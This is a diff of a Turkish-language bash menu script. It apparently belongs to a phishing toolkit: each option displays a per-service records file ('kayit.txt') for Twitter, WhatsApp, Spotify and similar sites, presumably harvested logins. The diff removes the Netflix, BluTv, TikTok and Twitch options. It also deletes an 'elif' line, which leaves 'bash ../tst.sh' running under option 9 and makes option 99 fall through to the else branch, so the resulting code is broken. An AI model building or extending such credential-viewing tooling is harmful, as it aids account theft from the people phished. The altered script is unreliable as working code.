@@ -21,11 +21,7 @@ banner_code(){
 			\e[31m[\e[32m06\e[31m]\e[37mTwitter Panel       
 			\e[31m[\e[32m07\e[31m]\e[37mYoutube         
 			\e[31m[\e[32m08\e[31m]\e[37mWhatsapp           
-			\e[31m[\e[32m09\e[31m]\e[37mSpofity           
-			\e[31m[\e[32m10\e[31m]\e[37mNetflix       
-			\e[31m[\e[32m11\e[31m]\e[37mBlu Tv    
-			\e[31m[\e[32m12\e[31m]\e[37mTikTok
-			\e[31m[\e[32m13\e[31m]\e[37mTwitch
+			\e[31m[\e[32m09\e[31m]\e[37mSpofity          
 
 
     \e[31m[\e[32m99\e[31m]\e[37mBir Önceki Ana Menü
@@ -97,34 +93,6 @@ elif [[ $islem_code == 9 || $islem_code == 09 ]]; then
 	echo -e "\e[37m"
 	cat spofity/kayit.txt
 
-elif [[ $islem_code == 10 ]]; then
-	echo ""
-	echo -e "\e[33mVeriler Geliyor...."
-	sleep 2
-	echo -e "\e[37m"
-	cat netflix/kayit.txt
-
-elif [[ $islem_code == 11 ]]; then
-	echo ""
-	echo -e "\e[33mVeriler Geliyor...."
-	sleep 2
-	echo -e "\e[37m"
-	cat blutv/kayit.txt
-
-elif [[ $islem_code == 12 ]]; then
-	echo ""
-	echo -e "\e[33mVeriler Geliyor...."
-	sleep 2
-	echo -e "\e[37m"
-	cat tiktok/kayit.txt
-
-elif [[ $islem_code == 13 ]]; then
-	echo ""
-	echo -e "\e[33mVeriler Geliyor...."
-	sleep 2
-	echo -e "\e[37m"
-	cat twitch/kayit.txt	
-elif [[ $islem_code == 9 || $islem_code == 99 ]]; then
 		bash ../tst.sh	
 
 else 
